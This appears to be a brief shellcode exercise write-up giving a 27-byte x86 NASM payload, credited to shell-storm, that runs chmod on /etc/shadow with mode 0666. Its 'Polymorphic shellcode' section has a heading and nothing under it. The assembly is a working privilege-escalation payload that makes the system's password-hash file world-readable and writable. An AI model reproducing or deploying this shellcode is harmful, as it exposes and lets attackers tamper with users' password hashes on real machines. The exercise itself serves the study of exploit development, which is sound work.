## Initial nasm code

Original shellcode: [Link](http://shell-storm.org/shellcode/files/shellcode-566.php)

Length: 27 bytes

    ; chmod("//etc/shadow", 0666);
    mov al, 15
    cdq
    push edx
    push dword 0x776f6461
    push dword 0x68732f63
    push dword 0x74652f2f
    mov ebx, esp
    mov cx, 0666o
    int 0x80

    
  
 ## Polymorphic shellcode

Length: 


